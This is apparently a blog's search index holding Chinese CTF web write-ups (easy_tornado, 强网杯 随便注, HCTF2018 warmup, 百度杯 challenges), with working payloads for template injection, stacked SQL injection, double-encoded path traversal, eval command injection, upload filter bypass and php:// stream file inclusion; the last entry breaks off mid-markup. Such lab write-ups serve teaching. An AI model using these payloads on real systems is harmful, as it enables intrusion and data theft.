<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>easy_tornado</title>
      <link href="/2019/12/13/easy-tornado/"/>
      <url>/2019/12/13/easy-tornado/</url>
      
        <content type="html"><![CDATA[<h1 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy_tornado"></a>easy_tornado</h1><p>进入题目网站，发现三个文件<br>flag.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/flag.txt</span><br><span class="line">flag in /fllllllllllllag</span><br></pre></td></tr></table></figure><p>发现flag在/fllllllllllllag文件里</p><p>welcome.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/welcome.txt</span><br><span class="line">Rende</span><br></pre></td></tr></table></figure><p>render是python中的一个渲染函数，渲染变量到模板中，即可以通过传递不同的参数形成不同的页面<br>hints.txt</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/hints.txt</span><br><span class="line">md5(cookie_secret+md5(filename))</span><br></pre></td></tr></table></figure><p>现在filename=/fllllllllllllag，只需要知道cookie_secret的既能访问flag。</p><p>到这就不知道怎么做了，根据查看大佬的writerup，才做出来的</p><p>有签名错误，发现/error?msg=签名错误，考虑<a href="https://www.freebuf.com/vuls/83999.html" target="_blank" rel="noopener">服务端模板注入（ssti攻击）</a><br>尝试输入/error?msg=1，确实是存在模板注入</p><p>尝试输入/error?msg=49，不存在运算</p><p>之后进行各种尝试与资料获取发现对于tornado框架存在附属文件handler.settings,于是尝试输入/error?msg=</p><p>发现 ‘cookie_secret’:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f52b1f85-76a5-4c65-8eb4-34e2aadbd140</span><br></pre></td></tr></table></figure><p>加密代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(s)</span>:</span></span><br><span class="line">    md5 = hashlib.md5()</span><br><span class="line">    md5.update(s.encode(<span class="string">"utf-8"</span>))</span><br><span class="line">    <span class="keyword">return</span> md5.hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filehash</span><span class="params">()</span>:</span></span><br><span class="line">    filename = <span class="string">'/fllllllllllllag'</span></span><br><span class="line">    cookie_secret = <span class="string">'f52b1f85-76a5-4c65-8eb4-34e2aadbd140'</span></span><br><span class="line">    print(md5(cookie_secret + md5(filename)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">filehash()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[强网杯 2019]随便注</title>
      <link href="/2019/12/13/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/"/>
      <url>/2019/12/13/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h1><blockquote><p>1‘ //首先尝试的加引号，报错了<br>1’ # //正常<br>1‘ order by 1 # //用order by 测试得到列数为2<br>1’ union select 1,2 # //回显了过滤规则 return preg_match(“/select|update|delete|drop|insert|where|./i”,$inject);</p></blockquote><a id="more"></a><p>看writeup 要用<a href="https://www.cnblogs.com/0nth3way/articles/7128189.html" target="_blank" rel="noopener">堆叠注入</a>。。</p><blockquote><p>1’;show databases; #</p></blockquote><blockquote><p>1’;show tables; # 发现两个表1919810931114514、words</p></blockquote><p>依次查询两张表的字段</p><blockquote><p>1’; show columns from 表名; #</p></blockquote><p>不过有点问题，只有words有回显。(翻博客发现数字串为表名的表操作时要加反引号，加上之后发现的确有flag字段)</p><p>内部查询语句类似 : select id, data from words where id =</p><p>(这里从上面的对words列的查询可以看到它是有两列，id和data)</p><p>然后1919810931114514只有一个flag字段</p><p>这时候虽然有强大的正则过滤，但没有过滤alert和rename关键字</p><p>这时候我们就可以已下面的骚姿势进行注入：</p><blockquote><p>1.将words表改名为word1或其它任意名字</p></blockquote><blockquote><p>2.1919810931114514改名为words</p></blockquote><blockquote><p>3.将新的word表插入一列，列名为id</p></blockquote><blockquote><p>4.将flag列改名为data</p></blockquote><p>构造payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=0&apos;;alter table words rename to word;alter table`1919810931114514` rename to words;alter table words change flag data varchar(100);alter table words add column id int(10) default 1 --+</span><br></pre></td></tr></table></figure><p>接着我们再用1’ or 1=1 #,查询就得到flag</p><blockquote><p>注：这里要注意几个问题：<br>•    对表名为纯数字的表进行操作时，要在前后加上`符号。由于刚开始不知道，在这卡了一段时间。<br>•    对列名进行更改时，要在后面指定修改后的数据类型<br>•    添加id列时，设置默认值，方便后面查询（1’ or 1=1也可）</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HCTF2018-warmup-writeup</title>
      <link href="/2019/12/13/HCTF2018-warmup-writeup/"/>
      <url>/2019/12/13/HCTF2018-warmup-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="HCTF2018-warmup-writeup"><a href="#HCTF2018-warmup-writeup" class="headerlink" title="HCTF2018-warmup-writeup"></a>HCTF2018-warmup-writeup</h1><p>​    打开是个滑稽图片，然后看源码，访问source.php</p><p>是一串代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a><p>hint.php文件，访问后的确有一个hint，提示我们flag在ffffllllaaaagggg文件中<br>几个函数</p><blockquote><p>mb_strpos($string, $a)：查找字符串a在字符串string中首次出现的位置，起始位置以0开始；</p><p>mb_substr($string, $start, $end)：在字符串string中截取以start开始，以end结尾的子串；<br>可以看到函数代码中有四个if语句</p></blockquote><p>第一个if语句对变量进行检验，要求$page为字符串，否则返回false<br>第二个if语句判断$page是否存在于$whitelist数组中，存在则返回true<br>第三个if语句判断截取后的$page是否存在于$whitelist数组中，截取$page中’?’前部分，存在则返回true<br>第四个if语句判断url解码并截取后的$page是否存在于$whitelist中，存在则返回true</p><p>若以上四个if语句均未返回值，则返回false<br>有三个if语句可以返回true，第二个语句直接判断$page，不可用<br>第三个语句截取’?’前部分，由于?被后部分被解析为get方式提交的参数，也不可利用<br>第四个if语句中，先进行url解码再截取，因此我们可以将?经过两次url编码，在服务器端提取参数时解码一次，checkFile函数中解码一次，仍会解码为’?’，仍可通过第四个if语句校验。（’?’两次编码值为’%253f’）,构造url：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://***:***/source.php?file=source.php%253f../ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p>无返回值，由于我们不知道ffffllllaaaagggg文件的具体位置，只能依次增加../，最终在</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://***:***/source.php?file=source.php%253f../../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p>中成功回显flag</p><p>利用了CVE-2018-12613漏洞<br>这个漏洞利用了一个性值：如果将 ？双重编码，经过包含时会把你包含的文件当作一个目录，也就是说，如果你写入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint.php%25%3F（%25%3F是?的二次编码）</span><br></pre></td></tr></table></figure><p>那么解析时会把hint.php当作一个目录来看。<br>于是该题的payload可以是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=hint.php%253F/../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>“百度杯”CTF比赛 九月场</title>
      <link href="/2019/12/02/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-%E4%B9%9D%E6%9C%88%E5%9C%BA/"/>
      <url>/2019/12/02/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-%E4%B9%9D%E6%9C%88%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="“百度杯”CTF比赛-九月场-Writeup"><a href="#“百度杯”CTF比赛-九月场-Writeup" class="headerlink" title="“百度杯”CTF比赛-九月场 Writeup"></a>“百度杯”CTF比赛-九月场 Writeup</h1><h2 id="一-Test"><a href="#一-Test" class="headerlink" title="一 : Test"></a>一 : Test</h2><p>​    海洋cms，<img src="/2019/12/02/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-%E4%B9%9D%E6%9C%88%E5%9C%BA/1.png" alt></p><p>goolge查找以前的漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/search.php?searchtype=5&amp;tid=&amp;area=eval($_POST[cmd])</span><br></pre></td></tr></table></figure><p><img src="/2019/12/02/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-%E4%B9%9D%E6%9C%88%E5%9C%BA/2.png" alt></p><p>找到数据库配置文件</p><p><img src="/2019/12/02/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-%E4%B9%9D%E6%9C%88%E5%9C%BA/3.png" alt></p><p><img src="/2019/12/02/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-%E4%B9%9D%E6%9C%88%E5%9C%BA/4.png" alt></p><p>进入数据库找到flag</p><h2 id="二-123"><a href="#二-123" class="headerlink" title="二 :  123"></a>二 :  123</h2><p>​    f12看源码，提示用户信息在user.php,想到备份泄露，尝试user.php.bak得到文件</p><a id="more"></a><p>然后进行bp爆破，用攻城锤模式</p><p><img src="/2019/12/02/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-%E4%B9%9D%E6%9C%88%E5%9C%BA/5.png" alt></p><p>每次爆破改年份，最后是1990</p><p><img src="/2019/12/02/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-%E4%B9%9D%E6%9C%88%E5%9C%BA/6.png" alt></p><p>用lixiuyun登录，f12看源码</p><p><img src="/2019/12/02/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-%E4%B9%9D%E6%9C%88%E5%9C%BA/7.png" alt></p><p>f12把注释去掉，进行文件上传，发现不能包含php，用php别名</p><blockquote><p>php2, php3, php4, php5, phps, pht, phtm, phtml</p></blockquote><p><img src="/2019/12/02/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-%E4%B9%9D%E6%9C%88%E5%9C%BA/8.png" alt></p><p>改成1.jpg.phtml成功</p><p>然后访问<code>view.php</code></p><p>直接<code>view.php?file=flag</code>，结果为<code>filter &quot;flag&quot;</code></p><p>`双写绕过 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?file=flflagag</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>“百度杯”CTF比赛 2017 二月场</title>
      <link href="/2019/12/01/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-2017-%E4%BA%8C%E6%9C%88%E5%9C%BA/"/>
      <url>/2019/12/01/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-2017-%E4%BA%8C%E6%9C%88%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<h3 id="“百度杯”CTF比赛-2017-二月场-Writeup"><a href="#“百度杯”CTF比赛-2017-二月场-Writeup" class="headerlink" title="“百度杯”CTF比赛 2017 二月场 Writeup"></a>“百度杯”CTF比赛 2017 二月场 Writeup</h3><h2 id="一-：-爆破-1"><a href="#一-：-爆破-1" class="headerlink" title="一 ： 爆破-1"></a>一 ： 爆破-1</h2><p>打开链接,看到php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">$a = @$_REQUEST[<span class="string">'hello'</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/^\w*$/'</span>,$a ))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">'ERROR'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"var_dump($$a);"</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a><p>看到$$，应该是超全局变量</p><p>直接构造payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://abc741867e084776a3f60edf23a17e75edbd3a30f5cb4047.changame.ichunqiu.com/?hello=GLOBALS</span><br></pre></td></tr></table></figure><p>得到flag</p><p><img src="/2019/12/01/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-2017-%E4%BA%8C%E6%9C%88%E5%9C%BA/1.jpg" alt></p><h2 id="二-爆破-2"><a href="#二-爆破-2" class="headerlink" title="二 :  爆破-2"></a>二 :  爆破-2</h2><p>打开链接，php代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">$a = @$_REQUEST[<span class="string">'hello'</span>];</span><br><span class="line"><span class="keyword">eval</span>( <span class="string">"var_dump($a);"</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看到var_dump($a)，尝试用$GLOBALS</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://828a5642d838412dbeb8e07676951034a06796aaaccc4bfb.changame.ichunqiu.com/?hello=$GLOBALS</span><br></pre></td></tr></table></figure><p>发现没有flag</p><p><img src="/2019/12/01/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-2017-%E4%BA%8C%E6%9C%88%E5%9C%BA/2.jpg" alt></p><p>看提示说没在变量中</p><p>就尝试读取文件</p><p>两种方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?hello=file(&quot;flag.php&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?hello=);echo%20`cat%20./flag.php`;//</span><br></pre></td></tr></table></figure><p>用的第二种</p><p>eval语句就变成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(&quot;var_dump();echo `cat ./flag.php`;//&quot;);</span><br></pre></td></tr></table></figure><p>F12查看源码,得到flag</p><p><img src="/2019/12/01/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-2017-%E4%BA%8C%E6%9C%88%E5%9C%BA/3.jpg" alt></p><h2 id="三-爆破-3"><a href="#三-爆破-3" class="headerlink" title="三 :  爆破-3"></a>三 :  爆破-3</h2><p>打开看php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">require</span>(<span class="string">'./flag.php'</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'nums'</span>]))&#123;</span><br><span class="line">  $_SESSION[<span class="string">'nums'</span>] = <span class="number">0</span>;</span><br><span class="line">  $_SESSION[<span class="string">'time'</span>] = time();</span><br><span class="line">  $_SESSION[<span class="string">'whoami'</span>] = <span class="string">'ea'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'time'</span>]+<span class="number">120</span>&lt;time())&#123;</span><br><span class="line">  session_destroy();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$value = $_REQUEST[<span class="string">'value'</span>];</span><br><span class="line">$str_rand = range(<span class="string">'a'</span>, <span class="string">'z'</span>);</span><br><span class="line">$str_rands = $str_rand[mt_rand(<span class="number">0</span>,<span class="number">25</span>)].$str_rand[mt_rand(<span class="number">0</span>,<span class="number">25</span>)];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'whoami'</span>]==($value[<span class="number">0</span>].$value[<span class="number">1</span>]) &amp;&amp; substr(md5($value),<span class="number">5</span>,<span class="number">4</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">  $_SESSION[<span class="string">'nums'</span>]++;</span><br><span class="line">  $_SESSION[<span class="string">'whoami'</span>] = $str_rands;</span><br><span class="line">  <span class="keyword">echo</span> $str_rands;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'nums'</span>]&gt;=<span class="number">10</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>每次都会$_SESSION[‘whoami’] = $str_rands;设置一个随机的值</p><p>substr(md5($value),5,4)==0比较md5加密后的值是否为0，可以把value变成数组可以绕过</p><blockquote><p>因为md5加密一个数组值为null，而null==0 </p></blockquote><p>通过爆破10次后就可以得到flag;可以写python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">'http://1eff6bf7980b4fe580e8f34167ccaa79fc87bd91ab174f10.changame.ichunqiu.com/'</span></span><br><span class="line">session=requests.Session()</span><br><span class="line">html=session.get(url+<span class="string">'?value[]=ea'</span>).text</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    html=session.get(url+<span class="string">'?value[]='</span>+html[<span class="number">0</span>:<span class="number">2</span>]).text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'flag&#123;.*&#125;'</span> <span class="keyword">in</span> html:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> (html)</span><br></pre></td></tr></table></figure><p>得到flag</p><p><img src="/2019/12/01/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-2017-%E4%BA%8C%E6%9C%88%E5%9C%BA/4.jpg" alt></p><h2 id="四-：include"><a href="#四-：include" class="headerlink" title="四 ：include"></a>四 ：include</h2><p>打开看到代码在左上角</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'path'</span>]))&#123;</span><br><span class="line">    <span class="keyword">include</span>($_REQUEST[<span class="string">'path'</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">'phpinfo.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>根据提示是文件包含漏洞</p><p>就看phpinfo中的allow_url_include是否开启</p><p><img src="/2019/12/01/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-2017-%E4%BA%8C%E6%9C%88%E5%9C%BA/5.jpg" alt></p><p>开启的，就可以用php伪协议 php://input进行包含</p><p><img src="/2019/12/01/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-2017-%E4%BA%8C%E6%9C%88%E5%9C%BA/6.jpg" alt></p><p>用<?php echo system('ls') ?>列出目录</p><p>发现有个 dle345aae.php 文件，用php://filter读取文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?path=php://filter/read=convert.base64-encode/resource=dle345aae.php</span><br></pre></td></tr></table></figure><p>得到base64加密后的flag</p><p>解密得到flag</p><p><img src="/2019/12/01/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-2017-%E4%BA%8C%E6%9C%88%E5%9C%BA/7.jpg" alt></p><h2 id="五-：-Zone"><a href="#五-：-Zone" class="headerlink" title="五 ： Zone"></a>五 ： Zone</h2><p>打开链接是一个登录框，尝试sql注入，没发现注入点。看源码也没发现线索</p><p>然后想到抓包分析，看到response包有个参数是 login=0</p><p><img src="/2019/12/01/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-2017-%E4%BA%8C%E6%9C%88%E5%9C%BA/8.jpg" alt></p><p>然后把login改成1，登录成功，但是显示是乱码。</p><p><img src="/2019/12/01/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-2017-%E4%BA%8C%E6%9C%88%E5%9C%BA/9.jpg" alt></p><p>看到url有点特殊</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://f325bbb20d854d3fb14b3e100775cbd873a664048d4742a4.changame.ichunqiu.com/manages/admin.ph?module=ind../ex&amp;name=php</span><br></pre></td></tr></table></figure><p>返回正常，应该过滤了../</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 